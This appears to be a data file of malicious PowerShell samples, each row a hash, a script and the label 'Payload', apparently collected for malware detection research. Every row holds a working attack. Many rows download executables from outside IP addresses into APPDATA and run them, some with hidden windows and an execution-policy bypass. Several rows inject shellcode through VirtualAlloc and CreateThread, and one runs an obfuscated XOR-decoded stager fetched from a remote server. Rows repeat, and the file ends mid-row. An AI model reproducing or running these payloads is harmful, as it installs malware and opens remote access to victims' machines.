f150c926cfe5a29f0275f5e2736da8ce9eb5dacd9675fc7966611d6befe64ee7,"
PowerShell -ExecutionPolicy bypass -noprofile -windowstyle hidden -command (New-Object System.Net.WebClient).DownloadFile('http://93.174.94.135/~kali/ketty.exe', $env:APPDATA\profilest.exe );Start-Process ( $env:APPDATA\profilest.exe )

",Payload
09af554f88850c5beb4f3ce2631f4e49552e0482890e16dc7e57a500aabf4472,"
(New-Object System.Net.WebClient).DownloadFile('http://80.82.64.45/~yakar/msvmonr.exe',""$env:APPDATA\msvmonr.exe"");Start-Process (""$env:APPDATA\msvmonr.exe"")

",Payload
48e37a75ba72807d6465b052bf78740a533796a474213c3adb63d11e44f8e3dc,"
$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0x58,0x7a,0x17,0x20,0x68,0x02,0x00,0x11,0x51,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

",Payload
33b02ce9c12c837c63aa005ea8d516d840df90f0e01a076d483d2baf2ab4c7a3,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.58.30/~trevor/winx64.exe',""$env:APPDATA\winx64.exe"");Start-Process (""$env:APPDATA\winx64.exe"")

",Payload
33b02ce9c12c837c63aa005ea8d516d840df90f0e01a076d483d2baf2ab4c7a3,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.58.30/~trevor/winx64.exe',""$env:APPDATA\winx64.exe"");Start-Process (""$env:APPDATA\winx64.exe"")

",Payload
33b02ce9c12c837c63aa005ea8d516d840df90f0e01a076d483d2baf2ab4c7a3,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.58.30/~trevor/winx64.exe',""$env:APPDATA\winx64.exe"");Start-Process (""$env:APPDATA\winx64.exe"")

",Payload
53974967c18c4c4f0a6948c389aaa35f2d5c327d7ee7371bd27a4c4494c350dc,"
PowerShell -ExecutionPolicy bypass -noprofile -windowstyle hidden -command (New-Object System.Net.WebClient).DownloadFile('http://94.102.52.13/~yahoo/stchost.exe', $env:APPDATA\stchost.exe );Start-Process ( $env:APPDATA\stchost.exe )

",Payload
7347d4c91d2961086d51666c685a45190d36c32a48f33c861fcc60e7254b2b8d,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
09af554f88850c5beb4f3ce2631f4e49552e0482890e16dc7e57a500aabf4472,"
(New-Object System.Net.WebClient).DownloadFile('http://80.82.64.45/~yakar/msvmonr.exe',""$env:APPDATA\msvmonr.exe"");Start-Process (""$env:APPDATA\msvmonr.exe"")

",Payload
5d18a6e0b98f8d1575ea206673cac2a98afc055ed997d08c3c78b184954b9ad4,"
PowerShell -ExecutionPolicy bypass -noprofile -windowstyle hidden -command (New-Object System.Net.WebClient).DownloadFile('http://94.102.52.13/~harvy/scvhost.exe', $env:APPDATA\stvgs.exe );Start-Process ( $env:APPDATA\stvgs.exe )

",Payload
53974967c18c4c4f0a6948c389aaa35f2d5c327d7ee7371bd27a4c4494c350dc,"
PowerShell -ExecutionPolicy bypass -noprofile -windowstyle hidden -command (New-Object System.Net.WebClient).DownloadFile('http://94.102.52.13/~yahoo/stchost.exe', $env:APPDATA\stchost.exe );Start-Process ( $env:APPDATA\stchost.exe )

",Payload
7347d4c91d2961086d51666c685a45190d36c32a48f33c861fcc60e7254b2b8d,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
b6661bc9233551fb07b96d78c87917d5534e1f0eb1be25894eb5b5c9be7bd767,"
(New-Object System.Net.WebClient).DownloadFile('http://89.248.170.218/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
adeffa00d96e50a69bde640f9b4bca00be2ec8f4aa06a9827119ad857b45cd12,"
$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x01,0x08,0x68,0x02,0x00,0x11,0x5c,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

",Payload
cfdd6cb1f474ff9e5a32b8458c85d4e00426ddb444a25268af568fd206e54935,"
dir c:\;sleep(5);Set-ExecutionPolicy Bypass -Scope Process;sleep(5);dir d:\;IEX ((New-Object Net.WebClient).DownloadString('http://127.0.0.1/detxt.ps1') );dir c:\;detxt http://127.0.0.1/1.txt;

",Payload
b6661bc9233551fb07b96d78c87917d5534e1f0eb1be25894eb5b5c9be7bd767,"
(New-Object System.Net.WebClient).DownloadFile('http://89.248.170.218/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
1423a1c169a50dcb7446f76856210db51e7f9be2d7b95e37830b4150ed62c507,"
$WC=NEW-ObJEcT SySTeM.NeT.WeBCliENt;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wC.HeaDErS.AdD('User-Agent',$u);$Wc.PRoxY = [SysTEm.NeT.WEbRequEST]::DefAuLtWeBPROXY;$Wc.PROXy.CReDenTIAlS = [SYstEM.NET.CrEdEnTIALCacHE]::DeFAULTNetWOrKCredEntiALS;$K='7b24afc8bc80e548d66c4e7ff72171c5';$I=0;[CHaR[]]$b=([chAR[]]($wC.DOwnlOaDSTRiNG(""http://100.100.100.100:8080/index.asp"")))|%{$_-bXor$K[$I++%$k.LENgTh]};IEX ($b-joiN'')

",Payload
7347d4c91d2961086d51666c685a45190d36c32a48f33c861fcc60e7254b2b8d,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
03fb3a5dc681ec2dda81f769037429e068a6f24b191af6f4ef5415870edcd54f,"
$w2K = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $w2K -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xda,0xc6,0xbd,0xe1,0x6b,0xda,0x36,0xd9,0x74,0x24,0xf4,0x5b,0x29,0xc9,0xb1,0x47,0x83,0xeb,0xfc,0x31,0x6b,0x14,0x03,0x6b,0xf5,0x89,0x2f,0xca,0x1d,0xcf,0xd0,0x33,0xdd,0xb0,0x59,0xd6,0xec,0xf0,0x3e,0x92,0x5e,0xc1,0x35,0xf6,0x52,0xaa,0x18,0xe3,0xe1,0xde,0xb4,0x04,0x42,0x54,0xe3,0x2b,0x53,0xc5,0xd7,0x2a,0xd7,0x14,0x04,0x8d,0xe6,0xd6,0x59,0xcc,0x2f,0x0a,0x93,0x9c,0xf8,0x40,0x06,0x31,0x8d,0x1d,0x9b,0xba,0xdd,0xb0,0x9b,0x5f,0x95,0xb3,0x8a,0xf1,0xae,0xed,0x0c,0xf3,0x63,0x86,0x04,0xeb,0x60,0xa3,0xdf,0x80,0x52,0x5f,0xde,0x40,0xab,0xa0,0x4d,0xad,0x04,0x53,0x8f,0xe9,0xa2,0x8c,0xfa,0x03,0xd1,0x31,0xfd,0xd7,0xa8,0xed,0x88,0xc3,0x0a,0x65,0x2a,0x28,0xab,0xaa,0xad,0xbb,0xa7,0x07,0xb9,0xe4,0xab,0x96,0x6e,0x9f,0xd7,0x13,0x91,0x70,0x5e,0x67,0xb6,0x54,0x3b,0x33,0xd7,0xcd,0xe1,0x92,0xe8,0x0e,0x4a,0x4a,0x4d,0x44,0x66,0x9f,0xfc,0x07,0xee,0x6c,0xcd,0xb7,0xee,0xfa,0x46,0xcb,0xdc,0xa5,0xfc,0x43,0x6c,0x2d,0xdb,0x94,0x93,0x04,0x9b,0x0b,0x6a,0xa7,0xdc,0x02,0xa8,0xf3,0x8c,0x3c,0x19,0x7c,0x47,0xbd,0xa6,0xa9,0xf2,0xb8,0x30,0x92,0xab,0xc2,0xc5,0x7a,0xae,0xc4,0xd4,0x26,0x27,0x22,0x86,0x86,0x67,0xfb,0x66,0x77,0xc8,0xab,0x0e,0x9d,0xc7,0x94,0x2e,0x9e,0x0d,0xbd,0xc4,0x71,0xf8,0x95,0x70,0xeb,0xa1,0x6e,0xe1,0xf4,0x7f,0x0b,0x21,0x7e,0x8c,0xeb,0xef,0x77,0xf9,0xff,0x87,0x77,0xb4,0xa2,0x01,0x87,0x62,0xc8,0xad,0x1d,0x89,0x5b,0xfa,0x89,0x93,0xba,0xcc,0x15,0x6b,0xe9,0x47,0x9f,0xf9,0x52,0x3f,0xe0,0xed,0x52,0xbf,0xb6,0x67,0x53,0xd7,0x6e,0xdc,0x00,0xc2,0x70,0xc9,0x34,0x5f,0xe5,0xf2,0x6c,0x0c,0xae,0x9a,0x92,0x6b,0x98,0x04,0x6c,0x5e,0x18,0x78,0xbb,0xa6,0x6e,0x90,0x7f;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$CJB=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($CJB.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$CJB,0,0,0);for (;;){Start-sleep 60};

",Payload
7347d4c91d2961086d51666c685a45190d36c32a48f33c861fcc60e7254b2b8d,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
a664802f5d9a76b2770f2aedd3416a95391e987289fe9c39d0c5b9d5381bb57d,"
$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xba,0xac,0x6a,0x75,0xba,0xd9,0xe1,0xd9,0x74,0x24,0xf4,0x5e,0x29,0xc9,0xb1,0x47,0x83,0xc6,0x04,0x31,0x56,0x0f,0x03,0x56,0xa3,0x88,0x80,0x46,0x53,0xce,0x6b,0xb7,0xa3,0xaf,0xe2,0x52,0x92,0xef,0x91,0x17,0x84,0xdf,0xd2,0x7a,0x28,0xab,0xb7,0x6e,0xbb,0xd9,0x1f,0x80,0x0c,0x57,0x46,0xaf,0x8d,0xc4,0xba,0xae,0x0d,0x17,0xef,0x10,0x2c,0xd8,0xe2,0x51,0x69,0x05,0x0e,0x03,0x22,0x41,0xbd,0xb4,0x47,0x1f,0x7e,0x3e,0x1b,0xb1,0x06,0xa3,0xeb,0xb0,0x27,0x72,0x60,0xeb,0xe7,0x74,0xa5,0x87,0xa1,0x6e,0xaa,0xa2,0x78,0x04,0x18,0x58,0x7b,0xcc,0x51,0xa1,0xd0,0x31,0x5e,0x50,0x28,0x75,0x58,0x8b,0x5f,0x8f,0x9b,0x36,0x58,0x54,0xe6,0xec,0xed,0x4f,0x40,0x66,0x55,0xb4,0x71,0xab,0x00,0x3f,0x7d,0x00,0x46,0x67,0x61,0x97,0x8b,0x13,0x9d,0x1c,0x2a,0xf4,0x14,0x66,0x09,0xd0,0x7d,0x3c,0x30,0x41,0xdb,0x93,0x4d,0x91,0x84,0x4c,0xe8,0xd9,0x28,0x98,0x81,0x83,0x24,0x6d,0xa8,0x3b,0xb4,0xf9,0xbb,0x48,0x86,0xa6,0x17,0xc7,0xaa,0x2f,0xbe,0x10,0xcd,0x05,0x06,0x8e,0x30,0xa6,0x77,0x86,0xf6,0xf2,0x27,0xb0,0xdf,0x7a,0xac,0x40,0xe0,0xae,0x59,0x44,0x76,0x91,0x36,0x47,0xb7,0x79,0x45,0x48,0xb6,0xc2,0xc0,0xae,0xe8,0x64,0x83,0x7e,0x48,0xd5,0x63,0x2f,0x20,0x3f,0x6c,0x10,0x50,0x40,0xa6,0x39,0xfa,0xaf,0x1f,0x11,0x92,0x56,0x3a,0xe9,0x03,0x96,0x90,0x97,0x03,0x1c,0x17,0x67,0xcd,0xd5,0x52,0x7b,0xb9,0x15,0x29,0x21,0x6f,0x29,0x87,0x4c,0x8f,0xbf,0x2c,0xc7,0xd8,0x57,0x2f,0x3e,0x2e,0xf8,0xd0,0x15,0x25,0x31,0x45,0xd6,0x51,0x3e,0x89,0xd6,0xa1,0x68,0xc3,0xd6,0xc9,0xcc,0xb7,0x84,0xec,0x12,0x62,0xb9,0xbd,0x86,0x8d,0xe8,0x12,0x00,0xe6,0x16,0x4d,0x66,0xa9,0xe9,0xb8,0x76,0x95,0x3f,0x84,0x0c,0xf7,0x83;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

",Payload
2b9766b2c2dedb77ce395c04c7917d947e7044e0a5538769c3a414155dae7a14,"
$CCAN = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $CCAN -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xdb,0xdd,0xd9,0x74,0x24,0xf4,0xb8,0x8a,0x7b,0xeb,0xc0,0x5d,0x2b,0xc9,0xb1,0x47,0x31,0x45,0x18,0x03,0x45,0x18,0x83,0xc5,0x8e,0x99,0x1e,0x3c,0x66,0xdf,0xe1,0xbd,0x76,0x80,0x68,0x58,0x47,0x80,0x0f,0x28,0xf7,0x30,0x5b,0x7c,0xfb,0xbb,0x09,0x95,0x88,0xce,0x85,0x9a,0x39,0x64,0xf0,0x95,0xba,0xd5,0xc0,0xb4,0x38,0x24,0x15,0x17,0x01,0xe7,0x68,0x56,0x46,0x1a,0x80,0x0a,0x1f,0x50,0x37,0xbb,0x14,0x2c,0x84,0x30,0x66,0xa0,0x8c,0xa5,0x3e,0xc3,0xbd,0x7b,0x35,0x9a,0x1d,0x7d,0x9a,0x96,0x17,0x65,0xff,0x93,0xee,0x1e,0xcb,0x68,0xf1,0xf6,0x02,0x90,0x5e,0x37,0xab,0x63,0x9e,0x7f,0x0b,0x9c,0xd5,0x89,0x68,0x21,0xee,0x4d,0x13,0xfd,0x7b,0x56,0xb3,0x76,0xdb,0xb2,0x42,0x5a,0xba,0x31,0x48,0x17,0xc8,0x1e,0x4c,0xa6,0x1d,0x15,0x68,0x23,0xa0,0xfa,0xf9,0x77,0x87,0xde,0xa2,0x2c,0xa6,0x47,0x0e,0x82,0xd7,0x98,0xf1,0x7b,0x72,0xd2,0x1f,0x6f,0x0f,0xb9,0x77,0x5c,0x22,0x42,0x87,0xca,0x35,0x31,0xb5,0x55,0xee,0xdd,0xf5,0x1e,0x28,0x19,0xfa,0x34,0x8c,0xb5,0x05,0xb7,0xed,0x9c,0xc1,0xe3,0xbd,0xb6,0xe0,0x8b,0x55,0x47,0x0d,0x5e,0xc3,0x42,0x99,0xa1,0xbc,0x4d,0x3e,0x4a,0xbf,0x4d,0xdf,0x1a,0x36,0xab,0x8f,0x4a,0x19,0x64,0x6f,0x3b,0xd9,0xd4,0x07,0x51,0xd6,0x0b,0x37,0x5a,0x3c,0x24,0xdd,0xb5,0xe9,0x1c,0x49,0x2f,0xb0,0xd7,0xe8,0xb0,0x6e,0x92,0x2a,0x3a,0x9d,0x62,0xe4,0xcb,0xe8,0x70,0x90,0x3b,0xa7,0x2b,0x36,0x43,0x1d,0x41,0xb6,0xd1,0x9a,0xc0,0xe1,0x4d,0xa1,0x35,0xc5,0xd1,0x5a,0x10,0x5e,0xdb,0xce,0xdb,0x08,0x24,0x1f,0xdc,0xc8,0x72,0x75,0xdc,0xa0,0x22,0x2d,0x8f,0xd5,0x2c,0xf8,0xa3,0x46,0xb9,0x03,0x92,0x3b,0x6a,0x6c,0x18,0x62,0x5c,0x33,0xe3,0x41,0x5c,0x0f,0x32,0xaf,0x2a,0x61,0x86;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$ByK=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($ByK.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$ByK,0,0,0);for (;;){Start-sleep 60};

",Payload
7347d4c91d2961086d51666c685a45190d36c32a48f33c861fcc60e7254b2b8d,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
a21a5f29a2a8c0f242766d3a1c79f1a4e707b7b558bb02cb54de7e97af5d93fd,"
(New-Object System.Net.WebClient).DownloadFile('https://a.pomf.cat/drktzz.exe',""$env:TEMP\emmas.exe"");Start-Process (""$env:TEMP\emmas.exe"")

",Payload
7347d4c91d2961086d51666c685a45190d36c32a48f33c861fcc60e7254b2b8d,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
b6661bc9233551fb07b96d78c87917d5534e1f0eb1be25894eb5b5c9be7bd767,"
(New-Object System.Net.WebClient).DownloadFile('http://89.248.170.218/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
5d18a6e0b98f8d1575ea206673cac2a98afc055ed997d08c3c78b184954b9ad4,"
PowerShell -ExecutionPolicy bypass -noprofile -windowstyle hidden -command (New-Object System.Net.WebClient).DownloadFile('http://94.102.52.13/~harvy/scvhost.exe', $env:APPDATA\stvgs.exe );Start-Process ( $env:APPDATA\stvgs.exe )

",Payload
85ddac0c50f7a8449246521989fd5c5fded65123cb890a43d77094452f7d11db,"
(New-Object System.Net.WebClient).DownloadFile('http://93.174.94.137/~karma/scvhost.exe',""$env:APPDATA\scvhost.exe"");Start-Process (""$env:APPDATA\scvhost.exe"")

",Payload
7347d4c91d2961086d51666c685a45190d36c32a48f33c861fcc60e7254b2b8d,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
8b7c9e9f5ca1815f5b401b5da26d992e22d9ca15ccbd835388d0d318df8fc585,"
$1CU = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $1CU -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xdb,0xc4,0xd9,0x74,0x24,0xf4,0xba,0xd8,0xbb,0xf5,0xda,0x5f,0x2b,0xc9,0xb1,0x47,0x31,0x57,0x18,0x03,0x57,0x18,0x83,0xc7,0xdc,0x59,0x00,0x26,0x34,0x1f,0xeb,0xd7,0xc4,0x40,0x65,0x32,0xf5,0x40,0x11,0x36,0xa5,0x70,0x51,0x1a,0x49,0xfa,0x37,0x8f,0xda,0x8e,0x9f,0xa0,0x6b,0x24,0xc6,0x8f,0x6c,0x15,0x3a,0x91,0xee,0x64,0x6f,0x71,0xcf,0xa6,0x62,0x70,0x08,0xda,0x8f,0x20,0xc1,0x90,0x22,0xd5,0x66,0xec,0xfe,0x5e,0x34,0xe0,0x86,0x83,0x8c,0x03,0xa6,0x15,0x87,0x5d,0x68,0x97,0x44,0xd6,0x21,0x8f,0x89,0xd3,0xf8,0x24,0x79,0xaf,0xfa,0xec,0xb0,0x50,0x50,0xd1,0x7d,0xa3,0xa8,0x15,0xb9,0x5c,0xdf,0x6f,0xba,0xe1,0xd8,0xab,0xc1,0x3d,0x6c,0x28,0x61,0xb5,0xd6,0x94,0x90,0x1a,0x80,0x5f,0x9e,0xd7,0xc6,0x38,0x82,0xe6,0x0b,0x33,0xbe,0x63,0xaa,0x94,0x37,0x37,0x89,0x30,0x1c,0xe3,0xb0,0x61,0xf8,0x42,0xcc,0x72,0xa3,0x3b,0x68,0xf8,0x49,0x2f,0x01,0xa3,0x05,0x9c,0x28,0x5c,0xd5,0x8a,0x3b,0x2f,0xe7,0x15,0x90,0xa7,0x4b,0xdd,0x3e,0x3f,0xac,0xf4,0x87,0xaf,0x53,0xf7,0xf7,0xe6,0x97,0xa3,0xa7,0x90,0x3e,0xcc,0x23,0x61,0xbf,0x19,0xd9,0x64,0x57,0x62,0xb6,0x66,0x8a,0x0a,0xc5,0x68,0xd5,0x7b,0x40,0x8e,0x85,0x2b,0x03,0x1f,0x65,0x9c,0xe3,0xcf,0x0d,0xf6,0xeb,0x30,0x2d,0xf9,0x21,0x59,0xc7,0x16,0x9c,0x31,0x7f,0x8e,0x85,0xca,0x1e,0x4f,0x10,0xb7,0x20,0xdb,0x97,0x47,0xee,0x2c,0xdd,0x5b,0x86,0xdc,0xa8,0x06,0x00,0xe2,0x06,0x2c,0xac,0x76,0xad,0xe7,0xfb,0xee,0xaf,0xde,0xcb,0xb0,0x50,0x35,0x40,0x78,0xc5,0xf6,0x3e,0x85,0x09,0xf7,0xbe,0xd3,0x43,0xf7,0xd6,0x83,0x37,0xa4,0xc3,0xcb,0xed,0xd8,0x58,0x5e,0x0e,0x89,0x0d,0xc9,0x66,0x37,0x68,0x3d,0x29,0xc8,0x5f,0xbf,0x15,0x1f,0x99,0xb5,0x77,0xa3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$DZw=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($DZw.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$DZw,0,0,0);for (;;){Start-sleep 60};

",Payload
b6661bc9233551fb07b96d78c87917d5534e1f0eb1be25894eb5b5c9be7bd767,"
